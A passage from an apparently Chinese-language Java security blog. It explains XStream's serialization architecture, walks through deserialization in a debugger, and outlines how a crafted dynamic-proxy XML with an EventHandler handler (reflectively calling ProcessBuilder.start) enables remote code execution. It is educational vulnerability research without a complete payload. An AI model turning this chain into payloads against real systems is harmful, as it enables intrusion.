通过Mapper获取的Class对象后，接着调用lookupConverterForType获取对应Class的转换器，将其转化成对应实例对象。<strong>DefaultConverterLookup</strong>是该接口的实现类，同时实现了<strong>ConverterRegistry</strong>的接口，所有<strong>DefaultConverterLookup</strong>具备查找converter功能和注册converter功能。所有注册的转换器按一定优先级组成由<strong>TreeSet</strong>保存的有序集合(PS:<strong>XStream</strong> 默认使用了<strong>DefaultConverterLookup</strong>)。</li></ol><h2 id="2-1-MarshallingStrategy-编码策略"><a href="#2-1-MarshallingStrategy-编码策略" class="headerlink" title="2.1 MarshallingStrategy 编码策略"></a>2.1 MarshallingStrategy 编码策略</h2><ul><li>marshall：object 对象 -&gt; xml 编码</li><li>unmarshall：xml 编码 -&gt; object 对象</li></ul><p>两个重要的实现类：</p><ul><li><code>package com.thoughtworks.xstream.core.TreeMarshaller</code>：树编组程序，调用mapper和Converter把java对象转化成XML，里面的start方法开始编组，convertAnother方法把java对象转化成XML。</li><li><code>package com.thoughtworks.xstream.core.TreeUnmarshaller</code>：树解组程序，调用mapper和Converter把XML转化成java对象，里面的start方法开始解组，convertAnother方法把class转化成java对象。</li></ul><p>在<code>start()</code>方法中调用<code>convertAnother()</code>方法把 XML 转化为 Java 对象；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102144652.png" alt="img"></p><p>后续跟反序列化的过程中在进行详细的分析</p><h2 id="2-2-Mapper-映射器"><a href="#2-2-Mapper-映射器" class="headerlink" title="2.2 Mapper 映射器"></a>2.2 Mapper 映射器</h2><p>简单来说就是通过 mapper 获取对象对应的类、成员、Field 属性的 Class 对象，赋值给 XML 的标签字段，最终得到序列化后的 XML。</p><h2 id="2-3-Converter-转换器"><a href="#2-3-Converter-转换器" class="headerlink" title="2.3 Converter 转换器"></a>2.3 Converter 转换器</h2><p>XStream 为 Java 常见的类型提供了 Converter 转换器。转换器注册中心是 XStream 组成的核心部分。</p><p>转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为 XML 或将 XML 转换为对象。简单地说，就是输入 XML 后它能识别其中的标签字段并转换为相应的对象，反之亦然。</p><p>转换器需要实现 3 个方法，这三个方法分别是来自于 <code>Converter</code> 类以及它的父类 <code>ConverterMatcher</code></p><ul><li>canConvert 方法：告诉 XStream 对象，它能够转换的对象；</li><li>marshal 方法：能够将对象转换为 XML 时候的具体操作；</li><li>unmarshal 方法：能够将 XML 转换为对象时的具体操作；</li></ul><p>更多转换器可参考：<a href="https://x-stream.github.io/converters.html%EF%BC%8C%E8%BF%99%E9%87%8C%E5%91%8A%E8%AF%89%E4%BA%86%E6%88%91%E4%BB%AC%E9%92%88%E5%AF%B9%E5%90%84%E7%A7%8D%E5%AF%B9%E8%B1%A1%EF%BC%8CXStream">https://x-stream.github.io/converters.html，这里告诉了我们针对各种对象，XStream</a> 都做了哪些支持。</p><h2 id="2-4-EventHandler-类（与-XStream-无关）"><a href="#2-4-EventHandler-类（与-XStream-无关）" class="headerlink" title="2.4 EventHandler 类（与 XStream 无关）"></a>2.4 EventHandler 类（与 XStream 无关）</h2><p>EventHandler 类为动态生成事件侦听器提供支持，这些侦听器的方法执行一条涉及传入事件对象和目标对象的简单语句。</p><p>EventHandler 类是实现了 InvocationHandler 的一个类（动态代理），设计本意是为交互工具提供 beans，建立从用户界面到应用程序逻辑的连接。</p><p>EventHandler 类定义的代码如下，其含有 target 和 action 属性，在 <code>EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()</code> 的函数调用链中，会将前面两个属性作为类方法和参数继续反射调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EventHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;  <br>    <span class="hljs-keyword">private</span> Object target;  <br>    <span class="hljs-keyword">private</span> String action;  <br>...  <br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object proxy, <span class="hljs-keyword">final</span> Method method, <span class="hljs-keyword">final</span> Object[] arguments)</span> &#123;  <br>        ...  <br>                <span class="hljs-keyword">return</span> invokeInternal(proxy, method, arguments);  <br>        ...  <br>    &#125;  <br><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">invokeInternal</span><span class="hljs-params">(Object proxy, Method method, Object[] arguments)</span> &#123;  <br>        ...  <br>                <span class="hljs-type">Method</span> <span class="hljs-variable">targetMethod</span> <span class="hljs-operator">=</span> Statement.getMethod(  <br>                             target.getClass(), action, argTypes);  <br>                ...  <br>                <span class="hljs-keyword">return</span> MethodUtil.invoke(targetMethod, target, newArgs);  <br>            &#125;  <br>            ...  <br>    &#125;  <br>...  <br>&#125;<br>    <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">invokeInternal</span><span class="hljs-params">(Object proxy, Method method, Object[] arguments)</span> &#123;<br><span class="hljs-comment">//-------------------------------------part1----------------------------------        </span><br><span class="hljs-comment">//作用：获取interface的name,即获得Comparable,检查name是否等于以下3个名称        </span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> method.getName();<br>        <span class="hljs-keyword">if</span> (method.getDeclaringClass() == Object.class)  &#123;<br>            <span class="hljs-comment">// Handle the Object public methods.</span><br>            <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;hashCode&quot;</span>))  &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(System.identityHashCode(proxy));<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;equals&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> (proxy == arguments[<span class="hljs-number">0</span>] ? Boolean.TRUE : Boolean.FALSE);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;toString&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> proxy.getClass().getName() + <span class="hljs-string">&#x27;@&#x27;</span> + Integer.toHexString(proxy.hashCode());<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//-------------------------------------part2----------------------------------  </span><br><span class="hljs-comment">//貌似获取了一个class和object</span><br>        <span class="hljs-keyword">if</span> (listenerMethodName == <span class="hljs-literal">null</span> || listenerMethodName.equals(methodName)) &#123;<br>            Class[] argTypes = <span class="hljs-literal">null</span>;<br>            Object[] newArgs = <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">if</span> (eventPropertyName == <span class="hljs-literal">null</span>) &#123;     <span class="hljs-comment">// Nullary method.</span><br>                newArgs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;;<br>                argTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>&lt;?&gt;[]&#123;&#125;;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> applyGetters(arguments[<span class="hljs-number">0</span>], getEventPropertyName());<br>                newArgs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;input&#125;;<br>                argTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>&lt;?&gt;[]&#123;input == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> :<br>                                       input.getClass()&#125;;<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">lastDot</span> <span class="hljs-operator">=</span> action.lastIndexOf(<span class="hljs-string">&#x27;.&#x27;</span>);<br>                <span class="hljs-keyword">if</span> (lastDot != -<span class="hljs-number">1</span>) &#123;<br>                    target = applyGetters(target, action.substring(<span class="hljs-number">0</span>, lastDot));<br>                    action = action.substring(lastDot + <span class="hljs-number">1</span>);<br>                &#125;<br><span class="hljs-comment">//--------------------------------------part3----------------------------------------  </span><br><span class="hljs-comment">//var13获取了method的名称, var13=public java.lang.Process java.lang.ProcessBuilder.start() throws java.io.IOException                  </span><br>                <span class="hljs-type">Method</span> <span class="hljs-variable">targetMethod</span> <span class="hljs-operator">=</span> Statement.getMethod(<br>                             target.getClass(), action, argTypes);<br>                <span class="hljs-keyword">if</span> (targetMethod == <span class="hljs-literal">null</span>) &#123;<br>                    targetMethod = Statement.getMethod(target.getClass(),<br>                             <span class="hljs-string">&quot;set&quot;</span> + NameGenerator.capitalize(action), argTypes);<br>                &#125;<br>                <span class="hljs-keyword">if</span> (targetMethod == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">argTypeString</span> <span class="hljs-operator">=</span> (argTypes.length == <span class="hljs-number">0</span>)<br>                        ? <span class="hljs-string">&quot; with no arguments&quot;</span><br>                        : <span class="hljs-string">&quot; with argument &quot;</span> + argTypes[<span class="hljs-number">0</span>];<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<br>                        <span class="hljs-string">&quot;No method called &quot;</span> + action + <span class="hljs-string">&quot; on &quot;</span> +<br>                        target.getClass() + argTypeString);<br>                &#125;<br><span class="hljs-comment">//-------------------------------------part4----------------------------------  </span><br><span class="hljs-comment">//调用invoke,调用函数,执行命令                </span><br>                <span class="hljs-keyword">return</span> MethodUtil.invoke(targetMethod, target, newArgs);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(ex);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>                <span class="hljs-type">Throwable</span> <span class="hljs-variable">th</span> <span class="hljs-operator">=</span> ex.getTargetException();<br>                <span class="hljs-keyword">throw</span> (th <span class="hljs-keyword">instanceof</span> RuntimeException)<br>                        ? (RuntimeException) th<br>                        : <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(th);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-4-DynamicProxyConverter-动态代理转换器"><a href="#2-4-DynamicProxyConverter-动态代理转换器" class="headerlink" title="2.4 DynamicProxyConverter 动态代理转换器"></a>2.4 DynamicProxyConverter 动态代理转换器</h2><p>DynamicProxyConverter 即动态代理转换器，是 XStream 支持的一种转换器，其存在使得 XStream 能够把 XML 内容反序列化转换为动态代理类对象；</p><p>XStream 反序列化漏洞的 PoC 都是以 <code>DynamicProxyConverter</code> 这个转换器为基础来编写的。</p><p>以官网给的例子为例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>com.foo.Blah<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>com.foo.Woo<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.foo.MyHandler&quot;</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">something</span>&gt;</span>blah<span class="hljs-tag">&lt;/<span class="hljs-name">something</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span><br></code></pre></td></tr></table></figure><p>dynamic-proxy 标签在 XStream 反序列化之后会得到一个动态代理类对象，当访问了该对象的<code>com.foo.Blah</code> 或 <code>com.foo.Woo</code> 这两个接口类中声明的方法时（即 interface 标签内指定的接口类），就会调用 handler 标签中的类方法<code>com.foo.MyHandler</code></p><h1 id="三、XStream-序列化和反序列化实践"><a href="#三、XStream-序列化和反序列化实践" class="headerlink" title="三、XStream 序列化和反序列化实践"></a>三、XStream 序列化和反序列化实践</h1><ul><li>定义接口 IPerson</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IPerson</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">output</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>定义 Person 实现接口 IPerson</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> XStream-unSer</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.Person.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/12/10 19:02</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IPerson</span> &#123;<br>    String name;<br>    <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">output</span><span class="hljs-params">()</span> &#123;<br>        System.out.print(<span class="hljs-string">&quot;Hello, this is &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot;, age &quot;</span> + <span class="hljs-built_in">this</span>.age);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>XStream 序列化 Serialize.java</li></ul><p>XStream 序列化时调用<code>XStream.toXML()</code>来实现的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> XStream-unSer</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.Serialize.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/12/10 19:05</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Serialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">18</span>);<br>        person.setName(<span class="hljs-string">&quot;candy&quot;</span>);<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xstream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">xml</span> <span class="hljs-operator">=</span> xstream.toXML(person);<br>        System.out.println(xml);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102143070.png" alt="img"></p><p>XStream 反序列化通过调用<code>XStream.fromXML()</code>实现，其中获取 XML 文件内容可以通过<code>Scanner()</code>或<code>FileInputStream</code>来获取；</p><ul><li>XStream 反序列化 Deserialize.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> XStream-unSer</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.Deserialize.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/12/10 19:12</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Deserialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;tmp.xml&quot;</span>);<br>            <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>            <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Person) xStream.fromXML(fis);<br>            p.output();<br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102144873.png" alt="img"></p><h1 id="四、XStream反序列化流程分析"><a href="#四、XStream反序列化流程分析" class="headerlink" title="四、XStream反序列化流程分析"></a>四、XStream反序列化流程分析</h1><p>本人分析完以后发现，这部分内容并不重要，因为 XStream 漏洞产生的原因不是因为 XStream 反序列化本身导致的，而是因为 XStream 支持的一个名为 <code>DynamicProxyConverter</code> 的转换器</p><h2 id="4-1-反序列化分析"><a href="#4-1-反序列化分析" class="headerlink" title="4.1 反序列化分析"></a>4.1 反序列化分析</h2><p>在 Person 类反序列化调用的<code>fromXML()</code>下断点进行调试分析其反序列化的过程；</p><ul><li>tmp.xml</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">com.candy.Person</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>candy<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">com.candy.Person</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102143990.png" alt="img"></p><p><code>F7</code>跟进可以看到<code>unmarshal()</code>函数，就是之前我们说将 XML 转换为对象的函数，我们继续跟进<code>unmarshal()</code>函数，可以看到还是执行一个<code>unmarshal()</code>函数，继续跟进</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102143078.png" alt="img"></p><p>可以看到这个函数先进行了一个安全判断，再次之后执行<code>marshallingStrategy</code>的<code>unmarshal()</code>函数，继续跟进该函数；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102143190.png" alt="img"></p><p>来到了抽象类<code>AbstractTreemarshallingStrategy</code>，其中调用了<code>start()</code>方法，我们跟进<code>start()</code>方法，来到</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102144793.png" alt="img"></p><p>这个函数就是我们在进行源码分析的时候介绍的反序列化方法，其中 type 是由<code>reader</code>和<code>mapper</code>获取中，其中 reader 中包含了我们的类信息，获取的 type 是跟我们反序列化的类的类型相关的数据，进入<code>convertAnother()</code>进行详细分析；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102144859.png" alt="img"></p><p>来到这里我们看到，这个<code>converter</code>是根据 type 查询到的转换器，根据之前的介绍知道，converter 是将输入 XML 后它能识别其中的标签字段并转换为相应的对象工具；</p><p>获取到 converter 后，我们跟进下面的<code>convert()</code>方法中查看详细的转换过程；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102144779.png" alt="img"></p><p>一路<code>F8</code>执行来到这里进入父类的<code>convert()</code>；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102144354.png" alt="img"></p><p>又看到一个<code>unmarshal</code>方法，肯定跟反序列化有关，继续跟进；跟进后一路<code>F8</code>来到这里对其中的属性进行反序列化</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102143718.png" alt="img"></p><p>这里存在两个方法，第一个方法<code>instantiateNewInstance(reader, context);</code>创建了一个反序列化的对象实例；然后<code>doUnmarshal(result, reader, context);</code>对对象实例中的属性进行意义反序列化赋值；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102144772.png" alt="img"></p><p><code>F7</code>跟进这个函数查看具体实现；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102144221.png" alt="img"></p><p>执行完该函数发现返回了第一个属性的值；具体的反序列化结果和之前的内容相差不大；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102143879.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102143871.png" alt="img"></p><p>在这里将相应的值写入对应的属性中，在执行完毕以后，后面存在一个 while 循环判断是否还有其他的属性（好像是在<code>doUnmarshal</code>进行属性循环检查的）；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412102144189.png" alt="img"></p><p>在这个 while 循环中一个一个的提取相应属性进行赋值；</p><h2 id="4-2-总结"><a href="#4-2-总结" class="headerlink" title="4.2 总结"></a>4.2 总结</h2><p>就上述的反序列化的分析流程看来，XStream 的反序列化本身似乎是没有什么问题的；</p><p>那么产生 XStream 反序列化漏洞的原因是什么呢？</p><h1 id="五、XStream-反序列化漏洞原理"><a href="#五、XStream-反序列化漏洞原理" class="headerlink" title="五、XStream 反序列化漏洞原理"></a>五、XStream 反序列化漏洞原理</h1><p>这里先简单讲讲 XStream 反序列化漏洞原理，后续在详细介绍一下如何应用；</p><p>XStream 反序列化漏洞的存在是因为 XStream 支持一个名为 <code>DynamicProxyConverter</code> 的转换器，该转换器可以将 XML 中 <code>dynamic-proxy</code> 标签内容转换成动态代理类对象，而当程序调用了 <code>dynamic-proxy</code> 标签内的 <code>interface</code> 标签指向的接口类声明的方法时，就会通过动态代理机制代理访问 <code>dynamic-proxy</code> 标签内 <code>handler</code> 标签指定的类方法。</p><p>利用这个机制，攻击者可以构造恶意的XML内容，即 <code>dynamic-proxy</code> 标签内的 <code>handler</code> 标签指向如 <code>EventHandler</code> 类这种可实现任意函数反射调用的恶意类、<code>interface</code> 标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意 XML 内容后即可触发反序列化漏洞、达到任意代码执行的目的。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://drun1baby.top/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01">https://drun1baby.top/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01</a></li><li><a href="https://xz.aliyun.com/t/12784">https://xz.aliyun.com/t/12784</a></li><li><a href="https://www.jianshu.com/p/387c568faf62">https://www.jianshu.com/p/387c568faf62</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>反序列化</tag>
      
      <tag>XML</tag>
      
      <tag>XStream</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入理解POJONode的toString调用任意类getter方法原理</title>
    <link href="/2024/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3POJONode%E7%9A%84toString%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8F%E7%B1%BBgetter%E6%96%B9%E6%B3%95%E5%8E%9F%E7%90%86/"/>
    <url>/2024/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3POJONode%E7%9A%84toString%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8F%E7%B1%BBgetter%E6%96%B9%E6%B3%95%E5%8E%9F%E7%90%86/</url>
    
